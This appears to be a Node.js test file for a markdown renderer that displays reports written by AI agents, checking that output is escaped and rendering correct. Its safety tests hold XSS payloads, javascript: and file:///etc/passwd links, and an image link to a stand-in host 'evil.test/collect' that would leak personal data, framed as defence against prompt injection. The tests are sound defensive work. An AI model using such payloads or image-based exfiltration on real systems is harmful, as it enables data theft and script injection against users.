const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const test = require('node:test');
const { transformSync } = require('@babel/core');

const file = path.resolve(__dirname, '../../resources/js/utils/markdown.js');
const { code } = transformSync(fs.readFileSync(file, 'utf8'), {
    babelrc: false,
    configFile: false,
    plugins: ['@babel/plugin-transform-modules-commonjs'],
});
const moduleObject = { exports: {} };
new Function('module', 'exports', code)(moduleObject, moduleObject.exports);
const { renderMarkdown: md, escapeHtml } = moduleObject.exports;

// The attributes found INSIDE tags (text that merely looks like an attribute is escaped and harmless)
function attributesOf(html) {
    const found = [];
    for (const [, , attributes] of html.matchAll(/<([a-z0-9]+)((?:\s[^<>]*)?)>/gi)) {
        for (const [, name] of attributes.matchAll(/\s([a-z-]+)=/gi)) found.push(name.toLowerCase());
    }

    return found.filter(name => !['href', 'target', 'rel', 'style', 'class'].includes(name));
}

// Safety: what an agent writes can come from a prompt injection

test('no tag of the input survives', () => {
    for (const evil of [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<iframe src="https://evil.test"></iframe>',
        '<a href="javascript:alert(1)" onclick="x()">clic</a>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        '<style>body{display:none}</style>',
    ]) {
        const html = md(evil);
        assert.doesNotMatch(html, /<(script|img|iframe|svg|style|a )/i, evil);
        assert.deepEqual(attributesOf(html), [], evil);
        assert.match(html, /&lt;/, evil);
    }
});

test('event handlers cannot be injected through a link, a title, a cell or a code block', () => {
    const html = md([
        '[clic](https://ok.test/" onmouseover="alert(1))',
        '',
        '| a" onclick="x | b |',
        '|---|---|',
        '| <b onmouseover=x> | `<img src=x onerror=y>` |',
        '',
        '```',
        '<script>alert(2)</script>',
        '```',
    ].join('\n'));

    assert.deepEqual(attributesOf(html), []);
    assert.doesNotMatch(html, /<script|<img|<b /i);
});

test('only http, https and mailto links are made, in a new tab without opener', () => {
    assert.match(md('[site](https://exemple.fr/page?a=1&b=2)'), /<a href="https:\/\/exemple\.fr\/page\?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">site<\/a>/);
    assert.match(md('[mail](mailto:a@b.fr)'), /<a href="mailto:a@b\.fr"/);

    for (const url of ['javascript:alert(1)', 'JavaScript:alert(1)', 'data:text/html,<script>', 'vbscript:x', '//evil.test', 'file:///etc/passwd', '/chemin/relatif']) {
        const html = md(`[x](${url})`);
        assert.doesNotMatch(html, /<a /, url);
    }
});

test('images are not rendered: they would send data to a stranger as soon as they are displayed', () => {
    const html = md('![secret](https://evil.test/collect?data=Dupont+0600000000)');

    assert.doesNotMatch(html, /<img/);
    // It becomes plain text and, since the address is a valid link, at most a harmless link
    assert.doesNotMatch(html, /src=/);
});

test('the internal markers cannot be forged', () => {
    const html = md('\u0001999\u0001 et \u0000 `code`');

    assert.match(html, /<code>code<\/code>/);
    assert.doesNotMatch(html, /undefined/);
});

test('escapeHtml escapes the five characters', () => {
    assert.equal(escapeHtml(`<>&"'`), '&lt;&gt;&amp;&quot;&#39;');
});

test('nothing in, nothing out', () => {
    assert.equal(md(null), '');
    assert.equal(md(undefined), '');
    assert.equal(md(''), '');
});

// What it renders

test('titles, paragraphs and line breaks', () => {
    assert.equal(md('# Titre\n\nUn paragraphe\nsur deux lignes.'), '<h1>Titre</h1><p>Un paragraphe<br>sur deux lignes.</p>');
    assert.equal(md('### Trois ###'), '<h3>Trois</h3>');
});

test('bold, italic, strikethrough and inline code', () => {
    assert.equal(md('**gras** et *italique* et ~~barré~~ et `code`'), '<p><strong>gras</strong> et <em>italique</em> et <del>barré</del> et <code>code</code></p>');
    // Nothing is formatted inside code
    assert.equal(md('`**pas gras**`'), '<p><code>**pas gras**</code></p>');
    // An underscore inside a word is not italic
    assert.equal(md('snake_case_name'), '<p>snake_case_name</p>');
    // Nor is a lone star
    assert.equal(md('2 * 3 = 6'), '<p>2 * 3 = 6</p>');
});

test('lists, nested lists and numbered lists', () => {
    assert.equal(md('- un\n- deux\n- trois'), '<ul><li>un</li><li>deux</li><li>trois</li></ul>');
    assert.equal(md('1. un\n2. deux'), '<ol><li>un</li><li>deux</li></ol>');
    assert.equal(md('- parent\n  - enfant\n  - autre\n- suivant'), '<ul><li>parent<ul><li>enfant</li><li>autre</li></ul></li><li>suivant</li></ul>');
});

test('tables keep their alignment and complete short rows', () => {
    const html = md('| Nom | Appels |\n|:---|---:|\n| Léa | 12 |\n| Max |');

    assert.match(html, /<table><thead><tr><th style="text-align:left">Nom<\/th><th style="text-align:right">Appels<\/th><\/tr><\/thead>/);
    assert.match(html, /<td style="text-align:left">Léa<\/td><td style="text-align:right">12<\/td>/);
    assert.match(html, /<td style="text-align:left">Max<\/td><td style="text-align:right"><\/td>/);
});

test('a line with a pipe is not a table without its separator row', () => {
    assert.equal(md('a | b'), '<p>a | b</p>');
});

test('quotes, rules and code blocks', () => {
    assert.equal(md('> cité\n> sur deux lignes'), '<blockquote><p>cité<br>sur deux lignes</p></blockquote>');
    assert.equal(md('avant\n\n---\n\naprès'), '<p>avant</p><hr><p>après</p>');
    assert.equal(md('```js\nconst a = 1 < 2;\n```'), '<pre><code>const a = 1 &lt; 2;</code></pre>');
    // An unclosed block still ends with the text
    assert.equal(md('```\nfin'), '<pre><code>fin</code></pre>');
});

test('a report like the agents write renders as a whole', () => {
    const html = md([
        '# Activité de la semaine',
        '',
        '**Projet :** test2',
        '',
        '## Synthèse',
        '- 0 appel',
        '- 0 SMS',
        '',
        '| Personne | Appels |',
        '|---|---|',
        '| Super Admin | 0 |',
        '',
        '1. Vérifier le projet',
        '2. Refaire le rapport vendredi',
    ].join('\n'));

    assert.match(html, /^<h1>Activité de la semaine<\/h1><p><strong>Projet :<\/strong> test2<\/p><h2>Synthèse<\/h2><ul><li>0 appel<\/li><li>0 SMS<\/li><\/ul>/);
    assert.match(html, /<table>.*<td>Super Admin<\/td><td>0<\/td>.*<\/table><\/div><ol><li>Vérifier le projet<\/li><li>Refaire le rapport vendredi<\/li><\/ol>$/);
});

test('a very long text renders without blowing up', () => {
    const text = ('Ligne **grasse** avec `code` et [lien](https://a.test).\n').repeat(5000);
    const start = Date.now();
    const html = md(text);

    assert.ok(html.length > 0);
    assert.ok(Date.now() - start < 2000, 'too slow');
});
